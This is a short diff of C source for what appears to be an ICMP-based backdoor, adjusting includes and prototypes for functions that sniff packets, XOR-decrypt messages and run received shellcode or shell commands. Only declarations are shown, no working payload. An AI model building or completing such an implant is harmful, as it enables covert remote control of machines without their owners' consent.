@@ -5,12 +5,15 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <pcap.h>
 #include <netdb.h>
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <sys/mman.h>
 #include <bits/waitflags.h>
+#include <signal.h>
+#include <time.h>
 
 #define SIZE_ETHERNET   14
 #define STACK_SIZE      512
@@ -21,9 +24,6 @@
 
 #define MESSAGE_SHELLCODE 	0x01
 #define MESSAGE_COMMAND 	0x02
-
-#define SIG_IGN				1
-#define SIG_CHILD			17	
 
 #ifdef DEBUG
 #define DEBUG_WRAP(code) code
@@ -44,7 +44,7 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size);
 void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
 
 // Decrypt/encrypt data using the two byte key (Yay, xor)
-int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key);
+uint32_t decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key);
 
 // Process the received icmp message
 void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
